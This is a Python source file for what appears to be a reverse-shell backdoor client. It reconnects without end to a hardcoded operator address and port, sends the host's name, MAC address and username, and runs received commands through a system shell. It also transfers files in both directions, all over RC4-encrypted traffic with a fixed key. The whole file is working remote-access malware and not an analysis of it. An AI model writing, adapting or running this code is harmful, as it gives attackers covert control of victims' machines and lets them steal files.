import json
import os
import platform
import socket
import subprocess
import time
import uuid

import base64

key ='qazwsxedqazwsxed'

def rc4_setup(key):
    if isinstance(key,str):
        key = key.encode()
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key [i % len(key)]) % 256
        s[i],s[j] = s[j],s[i]
    return s
def rc4_crypt(data,key):
    if isinstance(data,str):
        data = data.encode()
    s = rc4_setup(key)
    i, j = 0, 0
    res = []
    for byte in data:
        i =(i +1)%256
        j =(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        res.append(byte^s[(s[i]+ s[j])%256])

    # print("加解密后长度:",len(res))
    return bytes(res)

def Rc4_Encrypt(data,key):
    # print("加密前长度:",len(data))
    return rc4_crypt(data,key)
def Rc4_Decrypt(data,key):
    # print("解密前长度:",len(data))
    return rc4_crypt(data,key)
def send_data(data):
    jsondata = json.dumps(data)
    encrypted_data = Rc4_Encrypt(jsondata.encode(), key)  # 使用服务端相同的密钥进行加密
    sock.send(encrypted_data)

def recv_data():
    data = b''
    while True:
        try:
            recv_data = sock.recv(10000000)#.decode().rstrip()
            data = recv_data
            if data != b'' or len(data) > 0:
                chunk = Rc4_Decrypt(data,key)
                ret = json.loads(str(chunk,encoding='utf-8').rstrip())
                return ret
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    sock.settimeout(1)
    chunk = Rc4_Decrypt(sock.recv(10000000),key)
    while chunk:
        f.write(chunk)
        try:
            chunk = Rc4_Decrypt(sock.recv(10000000),key)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    data_to_send = f.read()
    encrypted_data = Rc4_Encrypt(data_to_send, key)  # 加密数据
    sock.send(encrypted_data)
    f.close()

def get_hostname():
    hostname = socket.gethostname()
    return hostname
def shell(sock):
    hostname = get_hostname()
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                for ele in range(0, 8 * 6, 8)][::-1])
    he = os.environ.get("USER") or os.environ.get("USERNAME")
    data = f"{hostname},{mac_address},{he}"
    send_data(data)
    while True:
        command = recv_data()
        if command == 'q':
            continue
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command == 'kill':
            sock.close()
            break
        elif command == 'cd ..':
            os.chdir('..')
            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
        elif command.startswith('cd '):
            foldername = command[3:]
            os.chdir(foldername)
            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            ab = result.decode('utf-8')
            send_data(ab)
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.230.100', 4444)) #change ip and port
        shell(sock)
    except Exception as e:
        time.sleep(2)
